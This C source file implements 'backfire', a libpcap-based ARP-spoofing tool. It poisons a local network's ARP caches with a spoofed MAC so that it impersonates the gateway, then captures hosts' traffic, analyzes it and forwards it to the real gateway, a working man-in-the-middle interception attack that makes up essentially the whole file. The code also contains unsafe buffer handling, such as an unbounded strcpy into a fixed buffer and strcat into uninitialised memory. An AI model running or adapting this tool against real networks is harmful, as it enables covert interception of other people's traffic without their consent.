#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <pcap/pcap.h>

#include "formats.h"
#include "analyzer.h"

#define TRUE 1
#define FALSE 0
#define FAIL 2

#define BUFFSIZE 65535;
#define C_PACKETBUFFER_TM 256 // Customs handler packet buffer timeout
#define P_PACKETBUFFER_TM 1   // Poison handler packet buffer timeout

#define DEBUG { printf("DEBUG at line:%d\n", __LINE__); }


// ----- ----- STRUCTS ----- ----- //
struct _ThreadArgs {
  pcap_t** captureHandler;
  char* targetDev;
  int snaplen;
  int promisc;
  int packetBufferTm;
  char *filterExp;
  bpf_u_int32 devMask; // device mask
  void* callback;
};
typedef struct _ThreadArgs ThreadArgs;

struct _EthARP {
  EthHeader eth;
  ArpFormat arp;
};
typedef struct _EthARP EthARP;


// ----- ----- GLOBALS ----- ----- //
extern int errno;
char gErrbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer

pcap_t* gPoisongHandler;
pcap_t* gGatekeeperHandler;

char* gTargetDev = NULL;
char gGatewayIP[20]  = "192.168.1.1";
unsigned char gGatewayMAC[6];
const unsigned char gSpoofedMAC[6] = {0x3c, 0x5a, 0xb4, 0x88, 0x88, 0x88};
u_char* gGratuitousARPSpoof;

int gTerminate    = FALSE; // Terminates the execution if something went wrong
pthread_mutex_t m = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t c  = PTHREAD_COND_INITIALIZER;


// ----- ----- FUNCTION DEFINITIONS ----- ----- //
void printUsage();
void breakLoops(int signum);
char* policyParser(char* filename);
void* pcapLoop(void *vargp);
void Poisoner(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);
void Gatekeeper(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes);


// ----- ----- ARGUMENT PARSING ----- ----- //
int parseUArgs(int argc, char const *argv[]) {
  int opt;
  int gotGatewayMAC = FALSE;
  while ((opt = getopt(argc, (char *const *) argv, "i:a:d:h")) != -1) {
      switch (opt) {
      case 'i': {
        strcpy(gGatewayIP, optarg);
        break;
      }
      case 'a': {
        if(stringToMAC(optarg, gGatewayMAC) != 0) {
          printf("Wrong mac address format\n");
          return -1;
        }
        gotGatewayMAC = TRUE;
        break;
      }
      case 'd': {
        gTargetDev = optarg;
        break;
      }
      case 'h': {
        printUsage();
        exit(0);
      }
      default:
        fprintf(stderr, "Usage: %s [-i:a:h] [something...]\n", argv[0]);
        exit(EXIT_FAILURE);
      }
  }

  if(gotGatewayMAC==FALSE) {
    printf("-a isn't optional, -h for help\n");
    return -1;
  }
  else if(gTargetDev==NULL) {
    printf("No device specified, -h for help\n");
    return -1;
  }
  else return 0;
}


// ----- ----- MAIN ----- ----- //
void setup() {
  ARP_REQUEST = htons(ARP_REQUEST);
  ARP_REPLY   = htons(ARP_REPLY);
  IP_PROTO    = htons(IP_PROTO);

  // Preparing Gratuoitous packet
  unsigned char spoofIP[4];
  stringToIP(gGatewayIP, spoofIP);

  gGratuitousARPSpoof = (u_char*) malloc(ARP_SIZE);
  EthHeader* eth = (EthHeader*) gGratuitousARPSpoof;
  eth->type = htons(0x0806);
  memcpy(eth->dstAddr, ETH_BROADCAST, 6);
  memcpy(eth->srcAddr, gSpoofedMAC, 6);

  ArpFormat* arp = (ArpFormat*) (gGratuitousARPSpoof + 14);
  arp->operation = ARP_REPLY;
  arp->hwType = htons(0x0001); arp->hwLength = (6);
  arp->prType = htons(0x0800); arp->prLenght = (4);

  memcpy(arp->srcPrAddr, spoofIP, 4);
  memcpy(arp->dstPrAddr, spoofIP, 4);
  memcpy(arp->srcHwAddr, gSpoofedMAC, 6);
  memcpy(arp->dstHwAddr, ETH_BROADCAST, 6);
}

int main(int argc, char const *argv[]) {
  // Parsing policy file
  if(parseUArgs(argc, argv) == -1) return -1;
  char* policies = policyParser("policy.txt");

  setup();

  // Checking root permissions
  if(geteuid() != 0) {
    fprintf(stderr, "Permission denied\n");
    return FAIL;
  }

  // Retrieving device info
  bpf_u_int32 devIP;   // device ip address
  bpf_u_int32 devMask; // device mask
  if(pcap_lookupnet(gTargetDev, &devIP, &devMask, gErrbuf) != 0) {
    fprintf(stderr, "Cannot retrieve informations for %s\n", gTargetDev);
    return FAIL;
  }

  // Poisoner loop
  char* poisonerFilter = malloc(150 * sizeof(char));
  strcpy(poisonerFilter, "ether src host not ");
  char aus[20]; stringFyMAC(aus, gSpoofedMAC);
  strcat(poisonerFilter, aus);
  strcat(poisonerFilter, " && arp dst host ");
  strcat(poisonerFilter, gGatewayIP);


  ThreadArgs* poisonArgs = malloc(sizeof(ThreadArgs));
  poisonArgs -> captureHandler = &gPoisongHandler;
  poisonArgs -> targetDev = gTargetDev;
  poisonArgs -> snaplen = BUFFSIZE;
  poisonArgs -> promisc = TRUE;
  poisonArgs -> packetBufferTm = 1;
  poisonArgs -> filterExp = poisonerFilter;
  poisonArgs -> devMask = devMask;
  poisonArgs -> callback = Poisoner;

  pthread_t poisonerTid;
  pthread_create(&poisonerTid, NULL, pcapLoop, (void*) poisonArgs);

  // Gatekeeper loop
  char spoofedMac[18];
  stringFyMAC(spoofedMac, gSpoofedMAC);
  int policiesLength = (policies == NULL) ? 0 : strlen(policies);
  int filterLength = strlen(spoofedMac) + policiesLength + 100;
  char* gatekeeperFilter = malloc(filterLength * sizeof(char));

  strcat(gatekeeperFilter, "ether src not ");
  strcat(gatekeeperFilter, spoofedMac);
  strcat(gatekeeperFilter, " && ether dst ");
  strcat(gatekeeperFilter, spoofedMac);
  if(policies != NULL) {
    strcat(gatekeeperFilter, " && (");
    strcat(gatekeeperFilter, policies);
    strcat(gatekeeperFilter, ")");
    free(policies);
  }

  ThreadArgs* gatekeeperArgs = malloc(sizeof(ThreadArgs));
  gatekeeperArgs -> captureHandler = &gGatekeeperHandler;
  gatekeeperArgs -> targetDev = gTargetDev;
  gatekeeperArgs -> snaplen = BUFFSIZE;
  gatekeeperArgs -> promisc = TRUE;
  gatekeeperArgs -> packetBufferTm = 512;
  gatekeeperArgs -> filterExp = gatekeeperFilter;
  gatekeeperArgs -> devMask = devMask;
  gatekeeperArgs -> callback = Gatekeeper;

  pthread_t gatekeeperTid;
  pthread_create(&gatekeeperTid, NULL, pcapLoop, (void*) gatekeeperArgs);

  signal(SIGINT, breakLoops); // CRTL-C termination

  // If one of the threads stops exit
  while (TRUE) {
    pthread_mutex_lock(&m);
    int term = gTerminate;
    pthread_mutex_unlock(&m);
    if(term == TRUE) break;

    usleep(500 * 1000);
    pcap_sendpacket(gPoisongHandler, gGratuitousARPSpoof, ARP_SIZE);
  }

  breakLoops(0);

  pthread_join(gatekeeperTid, NULL);
  pthread_join(poisonerTid, NULL);

  printf("\nGlad to stop, sir.\n");
  freeDevTable();
  return 0;
}


// ----- ----- MISCELLANEOUS ----- ----- //
void printUsage() {
  printf("\
Usage: backfire [option]                                                       \n\
Option:                                                                        \n\
  -a [mac address]: gateway mac address to which sent resend captured packets  \n\
  -i [ip]         : target ip to spoof, default 192.168.1.1                    \n\
  -d [device]     : device from which capture and inject the traffic           \n\
  ");
  printf("\n");
}

void breakLoops(int signum) {
  if(gPoisongHandler    != NULL) pcap_breakloop(gPoisongHandler);
  if(gGatekeeperHandler != NULL) pcap_breakloop(gGatekeeperHandler);
}

char* policyParser(char* filename) {
  FILE* fp;
  char* line = NULL;
  char* policy = NULL;
  size_t len = 0;
  ssize_t cread;

  fp = fopen(filename, "r");
  if (fp == NULL) return NULL;

  while ((cread = getline(&line, &len, fp)) != -1) {
    line[strlen(line)-1] = '\0';
    if(strcmp(line, "") == 0) continue;
    if(policy != NULL) {
      int totalSize = (strlen(policy) + cread + 7) * sizeof(char);
      policy = realloc(policy, totalSize);
      strcat(policy, " or (");
      strcat(policy, line);
      strcat(policy, ")");
    }
    else {
      policy = malloc(cread * sizeof(char));
      strcpy(policy, line);
    }
  }

  fclose(fp);
  if (line) free(line);
  return policy;
}


// ----- ----- LOOP INITIALIZER ----- ----- //
void closeThread(ThreadArgs* args, pcap_t* handler, struct bpf_program* filter) {
  pthread_mutex_lock(&m);
  gTerminate = TRUE;
  pthread_cond_signal(&c);
  pthread_mutex_unlock(&m);

  if(handler != NULL) {
    pcap_close(handler);
    pcap_freecode(filter);
  }
  free(args);
}

void *pcapLoop(void *vargp) {
  ThreadArgs* args = (ThreadArgs*) vargp;
  pcap_t* handler;
  struct bpf_program filter;

  // Creating and opening handler
  if((handler = pcap_open_live(args->targetDev, args->snaplen, args->promisc, args->packetBufferTm, gErrbuf)) == NULL) {
    fprintf(stderr, "Cannot create or open packet capture handle for %s\n", args->targetDev);
    closeThread(args, handler, &filter);
    pthread_exit(NULL);
  }
  pcap_t** ghandler = args->captureHandler;
  *ghandler = handler;

  pcap_set_rfmon(handler, TRUE);

  // Setting up filters
  if (pcap_compile(handler, &filter, args->filterExp, TRUE, args->devMask) == -1) {
    fprintf(stderr, "Something wrong while parsing filter \"%s\": %s\n", args->filterExp, pcap_geterr(handler));
    closeThread(args, handler, &filter);
    pthread_exit(NULL);
  }
	if (pcap_setfilter(handler, &filter) == -1) {
    fprintf(stderr, "Something wrong while installing filter \"%s\": %s\n", args->filterExp, pcap_geterr(handler));
    closeThread(args, handler, &filter);
    pthread_exit(NULL);
	}

  pthread_mutex_lock(&m);
  int term = gTerminate;
  pthread_mutex_unlock(&m);
  if(term == TRUE) {
    closeThread(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up callback
  int loopReturn = pcap_loop(handler, -1, args->callback, (unsigned char *) handler);
  if(loopReturn == -1) {
    fprintf(stderr, "Error while looping");
  }

  // Cleaning
  closeThread(args, handler, &filter);
  pthread_exit(NULL);
}


// ----- ----- POISONING ----- ----- //
void Poisoner(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
  ArpFormat* arpMsg = (ArpFormat*) (bytes + 14); // 14 Byte Ethernet header

  // Poisoning ARP
  unsigned char dstPrAddr[4]; // Source protocol address (assuming IPv4)
  memcpy(dstPrAddr, (arpMsg->dstPrAddr), 4);

  arpMsg->operation = ARP_REPLY;
  memcpy(arpMsg->dstPrAddr, arpMsg->srcPrAddr, 4);
  memcpy(arpMsg->dstHwAddr, arpMsg->srcHwAddr, 6);
  memcpy(arpMsg->srcPrAddr, dstPrAddr, 4);
  memcpy(arpMsg->srcHwAddr, gSpoofedMAC, 6);

  // Rebuilding Ethernet frame
  EthHeader* eth = (EthHeader*) bytes;
  memcpy(eth->dstAddr, arpMsg->dstHwAddr, 6);
  memcpy(eth->srcAddr, arpMsg->srcHwAddr, 6);

  // Injecting ¯\_(ツ)_/¯
  pcap_sendpacket(gPoisongHandler, bytes, ARP_SIZE);
}


// ----- ----- GATEKEEPING ----- ----- //
void Gatekeeper(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes) {
  Analyze(h->caplen, bytes);

  // Rebuilding Ethernet frame
  EthHeader* eth = (EthHeader*) bytes;
  memcpy(eth->srcAddr, ETH_BROADCAST, 6);
  memcpy(eth->dstAddr, gGatewayMAC, 6);

  // Injecting
  int res = pcap_sendpacket(gGatekeeperHandler, bytes, h->len);
  if(res != 0) {
    fprintf(stderr, "Error while injecting: %s\n", pcap_geterr(gGatekeeperHandler));
  }
}
